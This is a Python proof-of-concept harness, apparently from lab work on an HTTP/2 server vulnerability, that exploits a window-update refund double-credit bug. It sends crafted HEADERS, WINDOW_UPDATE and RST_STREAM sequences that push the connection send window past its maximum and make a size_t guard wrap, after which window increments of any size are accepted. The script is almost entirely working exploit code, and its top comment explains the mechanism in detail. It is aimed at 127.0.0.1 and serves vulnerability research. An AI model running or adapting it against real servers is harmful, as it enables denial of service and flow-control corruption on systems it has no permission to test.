#!/usr/bin/env python3
"""WU-interleave refund double-credit probe — CVE-2026-123007 lab harness.

Observed mechanism this probe drives (all values from gdb worker bytes,
lab/tmp/gdb-wu-*.log):

    R_0 = MAX - blob_charge            (blob charged ~2,195,456 at setup)
    each cycle (HEADERS, WU, RST in one segment, processed in wire order):
        charge -65536  -> R_n - 65536
        WU 65536       -> guard: 65536 <= MAX - (R_n - 65536), i.e. R_n <= MAX
        refund +65536 -> R_{n+1} = R_n + 65536  (UNGARDED, filter:1767)
    so R climbs 65536/cycle and CROSSES MAX at cycle 33 (R_34 = MAX + 32768).

The cycle WU never sees R > MAX (it evaluates post-charge). The underflow
needs a WU that arrives while R > MAX, i.e. AFTER cycle 33's refund and
BEFORE the next charge: a standalone WU. Then the guard
`window > MAX - send_window` (size_t) wraps to ~2^64 and accepts any
increment — demonstrated with a second WU of 2^31-1.

Phase A proves one interleave; phase B pumps 34 cycles; phase C sends the
standalone WU (65536) then the 2^31-1 WU; phase D drains and checks the
connection still streams. The client never reads before phase D so the
socket stays blocked and queued DATA is never sent (refundable).
Loopback only (127.0.0.1).
"""

import json
import socket
import ssl
import struct
import sys
import time

HOST, PORT = "127.0.0.1", 8443
MAX_WINDOW = 0x7FFFFFFF
W1 = MAX_WINDOW - 65535          # -> connection send_window = MAX (pre-blob)
CHUNK = 65536                    # 8 DATA frames x 8192 charged per fresh stream
CYCLES = 33                      # pump until R = MAX + 32768 (observed)
BIG_WU = 0x7FFFFFFF              # phase C step 2: legal only after underflow

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FT_DATA, FT_HEADERS, FT_SETTINGS, FT_RST = 0, 1, 4, 3
FT_PING, FT_GOAWAY, FT_WU = 6, 7, 8
FLAG_END_STREAM, FLAG_END_HEADERS, FLAG_ACK = 0x1, 0x4, 0x1
RST_CANCEL = 8


def frame(ftype, flags, sid, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + \
        struct.pack(">I", sid) + payload


def window_update(sid, inc):
    return frame(FT_WU, 0, sid, struct.pack(">I", inc))


def rst(sid, status=RST_CANCEL):
    return frame(FT_RST, 0, sid, struct.pack(">I", status))


def ping(marker):
    assert len(marker) == 8
    return frame(FT_PING, 0, 0, marker)


def headers_block():
    return bytes([0x82, 0x87, 0x44, 5]) + b"/blob" + \
        bytes([0x41, 9]) + b"localhost"


def get_blob(sid):
    return frame(FT_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, sid,
                 headers_block())


def summarize(buf):
    """Count DATA bytes / PONG markers / GOAWAY from a byte slice."""
    data_bytes, pongs, goaway = 0, [], None
    i = 0
    while i + 9 <= len(buf):
        length = int.from_bytes(buf[i:i + 3], "big")
        ftype, flags = buf[i + 3], buf[i + 4]
        sid = int.from_bytes(buf[i + 5:i + 9], "big") & 0x7FFFFFFF
        if i + 9 + length > len(buf):
            break
        if ftype == FT_DATA:
            data_bytes += length
        elif ftype == FT_PING and flags & FLAG_ACK:
            pongs.append(buf[i + 9:i + 9 + length].decode("latin1"))
        elif ftype == FT_GOAWAY and len(buf[i + 9:i + 9 + length]) >= 8 \
                and goaway is None:
            p = buf[i + 9:i + 9 + length]
            goaway = {"last_sid": int.from_bytes(p[0:4], "big") & 0x7FFFFFFF,
                      "error_code": int.from_bytes(p[4:8], "big")}
        i += 9 + length
    return data_bytes, pongs, goaway


def main():
    result = {
        "build": sys.argv[1] if len(sys.argv) > 1 else "?",
        "w1": W1, "chunk": CHUNK, "cycles": CYCLES, "big_wu": BIG_WU,
    }

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    tls = ctx.wrap_socket(sock, server_hostname="localhost")

    settings = struct.pack(">HI", 0x4, MAX_WINDOW)   # INITIAL_WINDOW_SIZE
    tls.sendall(PREFACE + frame(FT_SETTINGS, 0, 0, settings)
                + window_update(0, W1) + get_blob(1))
    time.sleep(3)                                     # burst blocks socket
    tls.sendall(ping(b"mkA0ping"))                    # A0: MAX - blob_charge

    # ---- phase A: one interleave on stream 3 (mechanism proof) ----
    tls.sendall(get_blob(3))
    time.sleep(1.5)                                   # charge 65536
    tls.sendall(ping(b"mkA1ping"))                    # A1
    tls.sendall(window_update(0, CHUNK))              # refill
    time.sleep(0.5)
    tls.sendall(ping(b"mkA2ping"))                    # A2
    tls.sendall(rst(3))                               # refund on top of refill
    time.sleep(1.5)
    tls.sendall(ping(b"mkA3ping"))                    # A3: R = A2 + 65536

    # ---- phase B: pump CYCLES interleaves; R crosses MAX at cycle 33 ----
    for i in range(CYCLES):
        sid = 5 + 2 * i
        tls.sendall(get_blob(sid) + window_update(0, CHUNK) + rst(sid))
        if i % 10 == 9:
            time.sleep(0.3)
    time.sleep(2)
    tls.sendall(ping(b"mkB1ping"))                    # B1: expect MAX + 32768

    # ---- phase C: standalone WU while R > MAX -> guard wrap ----
    tls.sendall(window_update(0, CHUNK))               # any-size WU accepted?
    time.sleep(1.0)
    tls.sendall(ping(b"mkC1ping"))                    # C1: underflow credit
    tls.sendall(window_update(0, BIG_WU))             # 2^31-1 must be accepted
    time.sleep(1.0)
    tls.sendall(ping(b"mkC2ping"))                    # C2: post-BIG_WU state

    # ---- phase C2a (optional soak): extra BIG_WUs, each must be accepted;
    # argv[2] = count, default 0. Drive send_window into the 10^10 range
    # and flush the whole blob through the inflated-window path.
    soak = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2] else 0
    if soak:
        for _ in range(soak):
            tls.sendall(window_update(0, BIG_WU))
            time.sleep(0.2)
        tls.sendall(ping(b"mkS9ping"))
        result.setdefault("markers", []).append("mkS9ping")
        result["soak"] = soak

    # ---- phase D: drain; connection must still stream ----
    tls.settimeout(0.3)
    buf, eof = b"", False
    end = time.time() + (30 if soak else 8)
    while time.time() < end:
        try:
            chunk = tls.recv(262144)
        except (socket.timeout, TimeoutError):
            continue
        if not chunk:
            eof = True
            break
        buf += chunk
    data_bytes, pongs, goaway = summarize(buf)
    result.update({
        "drain": {"bytes": data_bytes, "raw": len(buf), "eof": eof,
                  "pongs": pongs, "goaway": goaway},
        "markers": ["mkA0ping", "mkA1ping", "mkA2ping", "mkA3ping",
                    "mkB1ping", "mkC1ping", "mkC2ping"],
        "sent_wu_total": W1 + CHUNK * (2 + CYCLES)
                          + BIG_WU * (1 + soak),
    })

    tls.close()
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
